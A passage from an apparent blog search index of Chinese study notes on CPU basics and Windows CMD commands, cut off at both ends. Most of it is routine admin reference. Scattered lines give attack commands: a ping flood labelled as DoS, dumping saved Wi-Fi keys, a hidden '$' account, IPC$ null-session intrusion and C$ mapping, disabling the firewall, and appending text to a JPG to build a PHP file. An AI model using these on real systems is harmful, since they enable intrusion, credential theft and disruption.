id="1-格式"><a href="#1-格式" class="headerlink" title="1 格式"></a>1 格式</h3><hr><h2 id="五、中央处理器"><a href="#五、中央处理器" class="headerlink" title="五、中央处理器"></a>五、中央处理器</h2><h3 id="1-CPU基础"><a href="#1-CPU基础" class="headerlink" title="1 CPU基础"></a>1 CPU基础</h3><ul><li><p>基本功能</p><blockquote><p>中央处理器（CPU）由运算器和控制器组成。</p></blockquote><ul><li>指令控制</li><li>操作控制</li><li>时间控制</li><li>数据加工</li><li>中断处理</li></ul></li><li><p>运算器</p><ul><li>算术逻辑单元</li><li>暂存寄存器</li><li>累加寄存器</li><li>通用寄存器组</li><li>程序状态字寄存器</li><li>移位器</li><li>计数器</li></ul></li><li><p>控制器</p><ul><li>程序计数器（PC）</li><li>指令寄存器（IR）</li><li>指令译码器</li><li>存储器地址寄存器（MAR）</li><li>存储器数据寄存器（MDR）</li><li>时序系统</li><li>微操作信号发生器</li></ul></li></ul><hr><h2 id="六、总线"><a href="#六、总线" class="headerlink" title="六、总线"></a>六、总线</h2><hr><h2 id="七、输入输出系统"><a href="#七、输入输出系统" class="headerlink" title="七、输入输出系统"></a>七、输入输出系统</h2>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows操作系统</title>
      <link href="/posts/3bb1b741.html"/>
      <url>/posts/3bb1b741.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h1><hr><h2 id="一、Windows使用"><a href="#一、Windows使用" class="headerlink" title="一、Windows使用"></a>一、Windows使用</h2><h3 id="1-控制面板"><a href="#1-控制面板" class="headerlink" title="1 控制面板"></a>1 控制面板</h3><h4 id="1-1-网络共享"><a href="#1-1-网络共享" class="headerlink" title="1.1 网络共享"></a>1.1 网络共享</h4><blockquote><p>高级选项——开启 / 关闭网络共享</p></blockquote><h3 id="2-快捷键"><a href="#2-快捷键" class="headerlink" title="2 快捷键"></a>2 快捷键</h3><h4 id="2-1-ctrl"><a href="#2-1-ctrl" class="headerlink" title="2.1 ctrl"></a>2.1 ctrl</h4><blockquote><p>Home / End：行首 / 尾</p><p>ctrl + Home / End ：从光标处到行首 / 尾</p><p>ctrl + shift + Home / End ：全选至行首 / 尾</p><p>ctrl + A：选取全部</p><p>ctrl + W：关闭所选窗口</p><p>ctrl + z：撤回</p><p>ctrl + shift + z：前进</p><p>ctrl + c：复制</p><p>ctrl + v：粘贴</p><p>ctrl + x：剪切</p></blockquote><h4 id="2-2-alt"><a href="#2-2-alt" class="headerlink" title="2.2 alt"></a>2.2 alt</h4><blockquote><p>alt + tab：切屏</p></blockquote><h4 id="2-3-win"><a href="#2-3-win" class="headerlink" title="2.3 win"></a>2.3 win</h4><blockquote><p>win + v：系统剪切板。</p></blockquote><hr><h2 id="二、CMD命令"><a href="#二、CMD命令" class="headerlink" title="二、CMD命令"></a>二、CMD命令</h2><h3 id="1-命令类型"><a href="#1-命令类型" class="headerlink" title="1 命令类型"></a>1 命令类型</h3><ul><li><p>内部命令：物理内存中的一部分，系统自带，如：copy</p></li><li><p>外部命令：调用了C盘中的程序（命令可以改），如：mstsc（远程桌面），ping</p><blockquote><p>外部命令可以下载安装，放入C:\Windows\System32可直接使用。</p></blockquote></li></ul><h3 id="2-帮助"><a href="#2-帮助" class="headerlink" title="2 帮助"></a>2 帮助</h3><ul><li>win+R 输入cmd打开cmd</li><li>命令 + /?：显示命令帮助</li></ul><h3 id="3-界面"><a href="#3-界面" class="headerlink" title="3 界面"></a>3 界面</h3><h4 id="3-1-自定义DOS界面"><a href="#3-1-自定义DOS界面" class="headerlink" title="3.1 自定义DOS界面"></a>3.1 自定义DOS界面</h4><ul><li><p><code>title + name</code>：标题</p></li><li><p><code>mode</code>：显示样式设置</p><blockquote><p><code>mode row,col</code>：设置行列值</p></blockquote></li><li><p>color Tens</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">颜色整数值：Ten digits：背景颜色，one digit：字体颜色</span><br><span class="line"><span class="built_in">title</span> <span class="built_in">cmd</span> demo</span><br><span class="line"><span class="built_in">mode</span> <span class="number">12</span>,<span class="number">24</span></span><br><span class="line"><span class="built_in">color</span> <span class="number">07</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-2-chcp"><a href="#3-2-chcp" class="headerlink" title="3.2 chcp"></a>3.2 chcp</h4><blockquote><p><a href="https://www.csdn.net/tags/MtjaEg4sMjE2NzYtYmxvZwO0O0OO0O0O.html#code_page_2"> &lt;其他&gt;参考连接</a></p></blockquote><ul><li><p><code>chcp</code>：查看当前编码 </p></li><li><p><code>chcp [nnn]</code>：修改当前编码 </p></li><li><p>一般编码代码</p></li></ul><div class="table-container"><table><thead><tr><th>语言</th><th>编码代码</th></tr></thead><tbody><tr><td>UTF-8</td><td>65001</td></tr><tr><td>简体中文（GB2312）</td><td>936</td></tr><tr><td>繁体中文BIG5</td><td>950</td></tr><tr><td>日文</td><td>932</td></tr><tr><td>美国/加拿大英语</td><td>437</td></tr><tr><td>俄文</td><td>866</td></tr><tr><td>韩文</td><td>949</td></tr></tbody></table></div><h3 id="4-网络"><a href="#4-网络" class="headerlink" title="4 网络"></a>4 网络</h3><h4 id="4-1-wget"><a href="#4-1-wget" class="headerlink" title="4.1 wget"></a>4.1 wget</h4><blockquote><p><code>wget + url</code>：爬取网站（存到当前路径下）</p></blockquote><ul><li>-r：递归全部爬取（慎用）</li><li>-l：设置层次</li><li>-o：设置输出位置</li></ul><h4 id="4-2-ipconfig"><a href="#4-2-ipconfig" class="headerlink" title="4.2 ipconfig"></a>4.2 ipconfig</h4><blockquote><p>ipconfig ：显示网络配置</p></blockquote><ul><li>/all：显示详细信息</li><li>/release：释放IP</li><li>/renew：重新获取IP</li><li>/flushdns：刷新DNS</li></ul><h4 id="4-3-ping"><a href="#4-3-ping" class="headerlink" title="4.3 ping"></a>4.3 ping</h4><blockquote><p>ping domain/IP：检测网络连通性。</p></blockquote><ul><li>-t：一直ping直到停止</li><li>-a：地址解析为主机名</li><li>-n num：指定数据包数量</li><li>-l large：指定数据包大小（字节）</li><li>-w timeout：指定超时时间（毫秒）（存疑：-w设置为大于0的数都能ping通）</li></ul><blockquote><p>DOS攻击：ping -l 65500 url -t</p><p>电脑打开热点后无法ping通127.0.0.1</p></blockquote><h4 id="4-4-telnet"><a href="#4-4-telnet" class="headerlink" title="4.4 telnet"></a>4.4 telnet</h4><blockquote><p>打开telnet：control——程序和功能——启动或关闭Windows功能——Telnet客户端</p><p><code>telnet [host [port]]</code>：连接端口（可用于检测端口是否开放）</p></blockquote><h4 id="4-5-netstat"><a href="#4-5-netstat" class="headerlink" title="4.5 netstat"></a>4.5 netstat</h4><blockquote><p>netstat：显示协议统计信息和TCP/IP状态</p></blockquote><ul><li>命令参数<ul><li>-a：详细</li><li>-n：外部地址显示为 IP:port</li><li>-o：关联的进程号</li><li>-r：路由表</li></ul></li><li>状态<ul><li>LISTENING（监听）</li><li>ESTABLISHED（连接）</li><li>CLOSED（关闭）</li><li>TIME-WAIT（等待足够时间）</li></ul></li></ul><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">查找指定端口</span><br><span class="line">netstat -ano | <span class="built_in">findstr</span> &quot;port&quot; | <span class="built_in">findstr</span> &quot;:port&quot;</span><br></pre></td></tr></table></figure><h4 id="4-6-netsh"><a href="#4-6-netsh" class="headerlink" title="4.6 netsh"></a>4.6 netsh</h4><ul><li><p>网络配置</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">netsh——int ip：进行ipv4配置</span><br><span class="line"><span class="built_in">set</span> address name=&quot;本地连接&quot; source=static/dhcp (addr=ip mask=mask)：设置本地ip</span><br><span class="line"><span class="built_in">set</span> address name=&quot;本地连接&quot; gateway=ip gwmetric=<span class="number">1</span>：设置网关</span><br><span class="line"></span><br><span class="line">dump：显示配置脚本</span><br><span class="line">netsh dump &gt; <span class="built_in">path</span>：导出配置到<span class="built_in">path</span>中</span><br><span class="line"></span><br><span class="line">netsh winsock reset：重置Winsock目录（重新初始化网络环境，解决软件冲突、病毒原因造成的参数错误）</span><br><span class="line">netsh int ip reset c:\resetlog.txt：重置TCP/IP协议，相当于重装TCP/IP协议，恢复到初次安装操作系统时的状态</span><br></pre></td></tr></table></figure></li><li><p>防火墙配置</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">firewall：简单配置</span><br><span class="line">advfirewall：高级配置</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">操作防火墙：netsh firewall <span class="built_in">set</span> opmode <span class="built_in">mode</span>=disable / enable（关闭 / 打开）</span><br><span class="line">开启端口：netsh firewall <span class="built_in">set</span> portopening TCP <span class="number">3389</span> ENABLE</span><br><span class="line">关闭端口：netsh firewall delete portopening TCP <span class="number">3389</span></span><br><span class="line">开启端口：netsh advfirewall firewall add rule name=baidujingyan <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line">关闭端口：netsh advfirewall firewall delete rule name=baidujingyan <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span>：<span class="keyword">in</span> / out（进站 / 出站）</span><br><span class="line">action：allow / disallow（允许 / 不允许）</span><br></pre></td></tr></table></figure></li><li><p>wifi配置</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles：连接过的wifi</span><br><span class="line">netsh wlan show profiles name=&quot;name&quot; key=clear：查看wifi详细信息</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-7-arp"><a href="#4-7-arp" class="headerlink" title="4.7 arp"></a>4.7 arp</h4><blockquote><p>查询arp记录</p></blockquote><ul><li>/a：查询arp</li><li>/s IP  mac：修改路由表</li></ul><h4 id="4-8-nsloopup"><a href="#4-8-nsloopup" class="headerlink" title="4.8 nsloopup"></a>4.8 nsloopup</h4><blockquote><p>查询DNS记录</p></blockquote><h4 id="4-9-tracert"><a href="#4-9-tracert" class="headerlink" title="4.9 tracert"></a>4.9 tracert</h4><blockquote><p>追踪网络</p><p><code>tracert + ip/域名</code>：测试网络</p></blockquote><h4 id="4-10-msg"><a href="#4-10-msg" class="headerlink" title="4.10 msg"></a>4.10 msg</h4><blockquote><p>局域网发送消息</p><p>发送方：<code>msg /server:127.0.0.1 * &quot;Do you like van you see?&quot;</code></p><p>接收方：需要在注册表中找到”计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server”，把AllowRemoteRPC”的值改为1。</p></blockquote><h3 id="5-文件"><a href="#5-文件" class="headerlink" title="5 文件"></a>5 文件</h3><h4 id="5-1-start"><a href="#5-1-start" class="headerlink" title="5.1  start"></a>5.1  start</h4><blockquote><p><code>start + 路径/网址</code>：打开</p><p>带空格打开带 <code>&quot; &quot;</code> </p><p>例：<code>start &quot;C:\Program Files (x86)\Baidu&quot;</code></p></blockquote><ul><li>/min：最小化打开</li><li>/max：最大化打开（默认）</li></ul><h4 id="5-2-call"><a href="#5-2-call" class="headerlink" title="5.2 call"></a>5.2 call</h4><blockquote><p>程序互相调用</p><p><code>call + 路径</code>：调用</p><p>调用完后会回到原来的程序。</p></blockquote><h4 id="5-3-sort"><a href="#5-3-sort" class="headerlink" title="5.3 sort"></a>5.3 sort</h4><blockquote><p>排序</p><p><code>sort + 路径</code>：对文件内容排序（按ASCII码顺序）</p></blockquote><ul><li>/+n：从第n个字符开始排序</li><li>/r：升序变降序</li><li>/o + 路径：重定向输出</li></ul><h4 id="5-4-创建"><a href="#5-4-创建" class="headerlink" title="5.4 创建"></a>5.4 创建</h4><blockquote><p><a href="https://www.iteye.com/blog/zhangjiankun880-962489">创建隐藏文件夹</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 创建文件</span><br><span class="line"><span class="built_in">cd</span>. &gt; a.txt</span><br><span class="line"># 创建文件夹</span><br><span class="line"><span class="built_in">md</span> <span class="built_in">path</span></span><br><span class="line"></span><br><span class="line"># 创建无法打开的文件夹</span><br><span class="line"><span class="built_in">md</span> e:\news..\</span><br></pre></td></tr></table></figure><h4 id="5-5-删除"><a href="#5-5-删除" class="headerlink" title="5.5 删除"></a>5.5 删除</h4><blockquote><p><code>rd + path</code>：删除文件夹</p><p><code>del + path</code>：删除文件</p></blockquote><ul><li>/f：强制删除只读文件</li><li>/s：删除所有子目录中的指定的文件</li><li>/q：安静模式。删除全局通配符时，不要求确认</li></ul><h4 id="5-6-ren"><a href="#5-6-ren" class="headerlink" title="5.6 ren"></a>5.6 ren</h4><blockquote><p>重命名文件</p><p><code>ren old new</code>：重命名</p></blockquote><h4 id="5-7-move"><a href="#5-7-move" class="headerlink" title="5.7 move"></a>5.7 move</h4><blockquote><p>移动文件</p><p><code>move old new</code>：移动</p></blockquote><h4 id="5-8-attrib"><a href="#5-8-attrib" class="headerlink" title="5.8 attrib"></a>5.8 attrib</h4><blockquote><p>更改文件属性</p><p><code>attrib</code>：操作文件</p></blockquote><ul><li>+h：隐藏文件</li><li>-h：显示文件</li></ul><h4 id="5-9-cd"><a href="#5-9-cd" class="headerlink" title="5.9 cd"></a>5.9 cd</h4><blockquote><p> 切换路径</p><p>切换盘： 直接盘名+： 例如：<code>D:</code></p><p>切换路径 ：<code>cd + 路径</code></p></blockquote><h3 id="6-内容"><a href="#6-内容" class="headerlink" title="6 内容"></a>6 内容</h3><h4 id="6-1-set"><a href="#6-1-set" class="headerlink" title="6.1 set"></a>6.1 set</h4><blockquote><p>显示、设置、删除 cmd.exe环境变量</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 显示环境变量</span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"># 显示环境变量name</span><br><span class="line"><span class="built_in">set</span> name：</span><br><span class="line"># 设置环境变量name值为xxx</span><br><span class="line"><span class="built_in">set</span> name=xxx</span><br><span class="line"># 设置值为空（等于删除环境变量）</span><br><span class="line"><span class="built_in">set</span> name=</span><br><span class="line"># 直接运算表达式的值（值可以赋给变量）</span><br><span class="line"><span class="built_in">set</span> /a &lt;expr&gt;</span><br><span class="line"># 输入赋值（值可以赋给变量）</span><br><span class="line"><span class="built_in">set</span> /p &lt;expr&gt;</span><br><span class="line"></span><br><span class="line"># 赋值案例</span><br><span class="line"><span class="built_in">set</span> /a var=<span class="number">4</span>*<span class="number">5</span></span><br><span class="line"><span class="built_in">set</span> /p var=请输入数字</span><br></pre></td></tr></table></figure><h4 id="6-2-copy"><a href="#6-2-copy" class="headerlink" title="6.2 copy"></a>6.2 copy</h4><blockquote><p>拼接文件</p><p><a href="https://www.iteye.com/blog/ongsh-875066">copy</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">COPY</span>[/D][/V][/N][/Y | /-Y][/Z][/A | /B ]source[/A |/B][+ source [/A | /B][+ ...]][destination[/A|/B]]</span><br><span class="line"># source 指定要复制的文件。</span><br><span class="line">/A # 表示一个 ASCII 文本文件。</span><br><span class="line">/B # 表示一个二进位文件。</span><br><span class="line">/D # 允许解密要创建的目标文件</span><br><span class="line"># destinaton 为新文件指定目录和/或文件名。</span><br><span class="line">/V # 验证新文件写入是否正确。</span><br><span class="line">/N # 复制带有非 <span class="number">8</span>dot3 名称的文件时，尽可能使用短文件名。</span><br><span class="line">/Y # 不使用确认是否要改写现有目标文件的提示。</span><br><span class="line">/-Y # 使用确认是否要改写现有目标文件的提示。</span><br><span class="line">/Z # 用可重新启动模式复制已联网的文件。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 案例</span><br><span class="line"><span class="built_in">copy</span> <span class="number">111</span>.jpg /b + a.txt /a test.php</span><br></pre></td></tr></table></figure><h4 id="6-3-type"><a href="#6-3-type" class="headerlink" title="6.3 type"></a>6.3 type</h4><blockquote><p>查看文件内容</p><p><code>type [drive:][path]filename</code>：显示内容</p></blockquote><h4 id="6-4-find"><a href="#6-4-find" class="headerlink" title="6.4 find"></a>6.4 find</h4><blockquote><p>查找字符串（编码必须是ANSI）</p><p><code>find &quot;str&quot;</code></p><p><code>findstr str</code></p></blockquote><h4 id="6-5-时间管理"><a href="#6-5-时间管理" class="headerlink" title="6.5 时间管理"></a>6.5 时间管理</h4><blockquote><p><code>date</code>：修改日期</p><p><code>time</code>：修改时间</p></blockquote><ul><li>/t：只读</li></ul><h4 id="6-6-tree"><a href="#6-6-tree" class="headerlink" title="6.6 tree"></a>6.6 tree</h4><blockquote><p>树形查看文件列表</p><p>tree：以图形显示驱动器或路径的文件夹结构。</p><p><code>TREE [drive:][path][/F][/A]</code></p></blockquote><ul><li>/f：显示每个文件夹中文件的名称。</li><li>/a：使用 ASCII 字符，而不使用扩展字符。</li></ul><h4 id="6-7-dir"><a href="#6-7-dir" class="headerlink" title="6.7 dir"></a>6.7 dir</h4><blockquote><p>查看当前目录文件</p><p>dir：查看文件</p></blockquote><ul><li>/a：详细查看全部类型文件（可以选择具体只查看哪种文件）<br>​</li></ul><h4 id="6-8-systeminfo"><a href="#6-8-systeminfo" class="headerlink" title="6.8 systeminfo"></a>6.8 systeminfo</h4><blockquote><p>systeminfo：获得设备运行状况</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 远程获得（system：ip地址，user：主机名，password：密码）</span><br><span class="line">systeminfo /S system /U domain\user /P password</span><br></pre></td></tr></table></figure><h4 id="6-9-whoami"><a href="#6-9-whoami" class="headerlink" title="6.9 whoami"></a>6.9 whoami</h4><blockquote><p>whoami：查询用户信息</p></blockquote><ul><li>/user：显示用户的SID</li></ul><h3 id="7-管理"><a href="#7-管理" class="headerlink" title="7 管理"></a>7 管理</h3><h4 id="7-1-磁盘管理"><a href="#7-1-磁盘管理" class="headerlink" title="7.1 磁盘管理"></a>7.1 磁盘管理</h4><h5 id="7-1-1-convert"><a href="#7-1-1-convert" class="headerlink" title="7.1.1 convert"></a>7.1.1 convert</h5><blockquote><p>转化卷</p><p>将 FAT 卷转换为 NTFS。</p></blockquote><h5 id="7-1-2-diskpart"><a href="#7-1-2-diskpart" class="headerlink" title="7.1.2 diskpart"></a>7.1.2 diskpart</h5><blockquote><p>磁盘管理</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">dispart：进入磁盘管理模式</span><br><span class="line"></span><br><span class="line">list disk：列出磁盘</span><br><span class="line">select disk n：选定第n块磁盘</span><br><span class="line">creat partition primary：创建主分区</span><br><span class="line"><span class="built_in">format</span> <span class="built_in">fs</span>=ntfs quick <span class="built_in">label</span>=&quot;E:&quot;：定义磁盘</span><br><span class="line">detail disk：显示磁盘分区</span><br><span class="line">select partition n：选择第n磁盘分区</span><br><span class="line">clean：格式化磁盘</span><br><span class="line"><span class="keyword">exit</span>：退出</span><br></pre></td></tr></table></figure><h5 id="7-1-3-sfc"><a href="#7-1-3-sfc" class="headerlink" title="7.1.3 sfc"></a>7.1.3 sfc</h5><blockquote><p>修复系统文件（admin下执行）</p><p>扫描所有保护的系统文件的完整性，并使用正确的 Microsoft 版本替换不正确的版本。</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">sfc：扫描</span><br><span class="line"></span><br><span class="line">/scannow：扫描并修复</span><br><span class="line">/verifyonly：扫描不修复</span><br><span class="line">或者指定文件</span><br></pre></td></tr></table></figure><h5 id="7-1-4-chkdsk"><a href="#7-1-4-chkdsk" class="headerlink" title="7.1.4 chkdsk"></a>7.1.4 chkdsk</h5><blockquote><p>检查磁盘</p><p>检查磁盘并显示状态报告。</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chkdsk</span> [+磁盘名]：检查磁盘（不输入名字是全部磁盘）</span><br><span class="line"></span><br><span class="line">/f：修复</span><br><span class="line">/s：查找坏扇区并修复可读文件</span><br></pre></td></tr></table></figure><h4 id="7-2-net管理"><a href="#7-2-net管理" class="headerlink" title="7.2 net管理"></a>7.2 net管理</h4><h5 id="7-2-1-net-user"><a href="#7-2-1-net-user" class="headerlink" title="7.2.1 net user"></a>7.2.1 net user</h5><blockquote><p>用户管理</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user [ name ]：查看用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user name [ passwd ]：对name用户进行操作</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user administrator passwd：（PowerShell打开）修改管理员密码</span><br><span class="line">/add：添加用户（需要密码）</span><br><span class="line">/<span class="built_in">del</span>：删除用户</span><br><span class="line">/active:no：禁用账户</span><br><span class="line">/active:yes：启用账户</span><br><span class="line">/Expires：设置账户过期时间（例：/Expires:nov,<span class="number">4</span>,<span class="number">2018</span>）</span><br><span class="line">/times：设置使用时段（例：/times:M-F,<span class="number">8</span>:<span class="number">00</span>-<span class="number">22</span>:<span class="number">00</span>;Sa-Su,<span class="number">19</span>:<span class="number">00</span>-<span class="number">21</span>:<span class="number">00</span>）</span><br><span class="line"><span class="built_in">net</span> user name$ passwd /add：设置隐藏账户</span><br></pre></td></tr></table></figure><h5 id="7-2-2-net-localgroup"><a href="#7-2-2-net-localgroup" class="headerlink" title="7.2.2 net localgroup"></a>7.2.2 net localgroup</h5><blockquote><p>本地组管理</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> localgroup [name]：查看组</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup [group] [user]：对用户在组中操作</span><br><span class="line">/add：加入组</span><br><span class="line">/<span class="built_in">del</span>：离开组</span><br></pre></td></tr></table></figure><h5 id="7-2-3-net-share-分享管理"><a href="#7-2-3-net-share-分享管理" class="headerlink" title="7.2.3 net share    分享管理"></a>7.2.3 net share    分享管理</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> share：查看共享</span><br><span class="line"><span class="built_in">net</span> view + hostname：查看指定主机的共享</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> share name=<span class="built_in">path</span>：设置共享路径，共享名（name + $：默认共享）</span><br><span class="line"><span class="built_in">net</span> share name /<span class="built_in">del</span>：取消共享</span><br></pre></td></tr></table></figure><h5 id="7-2-4-net-stat-服务管理"><a href="#7-2-4-net-stat-服务管理" class="headerlink" title="7.2.4 net stat    服务管理"></a>7.2.4 net stat    服务管理</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> stat + service：开启服务</span><br><span class="line"><span class="built_in">net</span> stop + service：关闭服务</span><br></pre></td></tr></table></figure><h5 id="7-2-5-net-use"><a href="#7-2-5-net-use" class="headerlink" title="7.2.5 net use"></a>7.2.5 net use</h5><blockquote><p>IPC$弱连接入侵</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use：查看记录的新的网络连接</span><br><span class="line"><span class="built_in">net</span> use \\IP\ipc$ &quot;&quot; /user:&quot;&quot;：建立空连接</span><br><span class="line"><span class="built_in">net</span> use \\IP\ipc$ &quot;username&quot; /user:&quot;passwd&quot;：建立非空连接</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$ &quot;passwd&quot; /user:&quot;username&quot;：将对方C盘映射到本地Z盘</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$：已经和目标建立了ipc$，则可以直接用IP+盘符+$访问</span><br><span class="line"><span class="built_in">net</span> use \\IP\ipc$ /<span class="built_in">del</span>：删除一个ipc$连接</span><br><span class="line"><span class="built_in">net</span> use c: /<span class="built_in">del</span>：删除共享映射c盘</span><br></pre></td></tr></table></figure><h4 id="7-3-进程管理"><a href="#7-3-进程管理" class="headerlink" title="7.3 进程管理"></a>7.3 进程管理</h4><blockquote><p><a href="https://zhidao.baidu.com/question/574634746.html"> &lt;其他&gt;参考连接</a></p></blockquote><h5 id="7-3-1-tasklist"><a href="#7-3-1-tasklist" class="headerlink" title="7.3.1 tasklist"></a>7.3.1 tasklist</h5><blockquote><p>显示进程</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">tasklist：查看运行中的进程</span><br><span class="line"></span><br><span class="line">tasklist | <span class="built_in">findstr</span> pid ：查看指定pid的进程信息</span><br></pre></td></tr></table></figure><h5 id="7-3-2-taskkill"><a href="#7-3-2-taskkill" class="headerlink" title="7.3.2 taskkill"></a>7.3.2 taskkill</h5><blockquote><p>杀死进程</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">taskkill</span> /pid xxx -f ：杀死进程（依照pid）</span><br><span class="line"><span class="built_in">taskkill</span> /im name /f ：杀死进程（依照名字）</span><br></pre></td></tr></table></figure><h5 id="7-3-3-计划任务"><a href="#7-3-3-计划任务" class="headerlink" title="7.3.3 计划任务"></a>7.3.3 计划任务</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">（已弃用）<span class="built_in">at</span>：查看计划任务</span><br><span class="line"><span class="built_in">at</span> <span class="built_in">time</span> &quot;exe&quot;：新加计划任务</span><br><span class="line"><span class="built_in">at</span> id /delete：删除计划任务</span><br><span class="line"></span><br><span class="line">schtasks.exe：查看计划任务</span><br></pre></td></tr></table></figure><h4 id="7-4-系统管理"><a href="#7-4-系统管理" class="headerlink" title="7.4 系统管理"></a>7.4 系统管理</h4><h5 id="7-4-1-runas"><a href="#7-4-1-runas" class="headerlink" title="7.4.1 runas"></a>7.4.1 runas</h5><blockquote><p>临时提权</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">开启许可：secpol.msc——本地策略——安全选项——账户：管理员账户状态——开启</span><br><span class="line"></span><br><span class="line">runas /noprofile /user:mymachine\administrator <span class="built_in">cmd</span>：临时管理员打开<span class="built_in">CMD</span>（mymachine：主机名）</span><br><span class="line">runas /user:mymachine\administrator /sa &quot;<span class="built_in">path</span>&quot;：临时管理员打开程序</span><br></pre></td></tr></table></figure><h5 id="7-4-2-shutdown"><a href="#7-4-2-shutdown" class="headerlink" title="7.4.2 shutdown"></a>7.4.2 shutdown</h5><blockquote><p>关机</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">shutdown：关机</span><br><span class="line"></span><br><span class="line">/i：图形化界面</span><br><span class="line">/s：关机</span><br><span class="line">/p：关机，无警告</span><br><span class="line">/r：重启</span><br><span class="line">/l：注销</span><br><span class="line">/a：终止关机</span><br><span class="line">/t <span class="built_in">time</span>：多少秒后关机</span><br></pre></td></tr></table></figure><h5 id="7-4-3-slmgr"><a href="#7-4-3-slmgr" class="headerlink" title="7.4.3 slmgr"></a>7.4.3 slmgr</h5><blockquote><p>激活操作系统</p><p>查看操作系统信息或激活操作系统。</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">slmgr：帮助</span><br><span class="line"></span><br><span class="line">/xpr：到期时间</span><br><span class="line">/dli：详细信息</span><br><span class="line">/upk：卸载密钥</span><br><span class="line">/ipk + n：安装密钥</span><br><span class="line">/skms name：设置密钥管理服务计算机名</span><br><span class="line">/ato：成功激活产品</span><br></pre></td></tr></table></figure><h5 id="7-4-4-注册表管理"><a href="#7-4-4-注册表管理" class="headerlink" title="7.4.4 注册表管理"></a>7.4.4 注册表管理</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">regedit：注册表编辑器</span><br><span class="line">HKEY_CURRENT_USER：当前用户</span><br><span class="line">HKEY_LOCAL_MACHINE：当前机器</span><br><span class="line"></span><br><span class="line">reg：操作注册表</span><br><span class="line">增删改查 </span><br><span class="line"></span><br><span class="line">备份：reg export &quot;key&quot; file.reg</span><br><span class="line">导出：file.reg / reg import file.reg</span><br></pre></td></tr></table></figure><h5 id="7-4-5-启动管理器"><a href="#7-4-5-启动管理器" class="headerlink" title="7.4.5 启动管理器"></a>7.4.5 启动管理器</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">winver：win版本</span><br><span class="line">taskmgr：任务管理器</span><br><span class="line">compmgmt：计算机管理</span><br><span class="line">lusrmgr.msc：用户管理</span><br><span class="line">services.msc：服务管理</span><br><span class="line">firewall.cpl：防火墙管理</span><br><span class="line">gpedit.msc：本地组策略管理</span><br><span class="line">secpol.msc：本地安全策略</span><br><span class="line">regedit：注册表编辑器</span><br><span class="line">eventvwr.msc ：日志查看器</span><br><span class="line">control：控制面板</span><br></pre></td></tr></table></figure><hr><h2 id="三、Bat脚本"><a href="#三、Bat脚本" class="headerlink" title="三、Bat脚本"></a>三、Bat脚本</h2><h3 id="1-回显"><a href="#1-回显" class="headerlink" title="1 回显"></a>1 回显</h3><blockquote><p><code>@echo off</code>与<code>@echo on</code> 前者为关闭回显，后者为打开回显<br>当不想批处理文件中的命令一行一行在DOS中显示出来时（因为全部显示出来的话看起来会变得很杂乱），可以使用@echo off，将其放于程序的最上方就行了。</p></blockquote><h3 id="2-交互"><a href="#2-交互" class="headerlink" title="2 交互"></a>2 交互</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">输入：<span class="built_in">set</span> /p expr：输入赋值（值可以赋给变量） </span><br><span class="line"></span><br><span class="line">输出：<span class="built_in">echo</span> + 语句</span><br><span class="line">语句：提示语句 </span><br><span class="line"><span class="variable">%variable%</span>：显示变量值</span><br><span class="line"></span><br><span class="line">例：<span class="built_in">echo</span> you input:<span class="variable">%var%</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">换行：</span><br><span class="line"><span class="built_in">echo</span>=</span><br><span class="line"><span class="built_in">echo</span>, </span><br><span class="line"><span class="built_in">echo</span>; </span><br><span 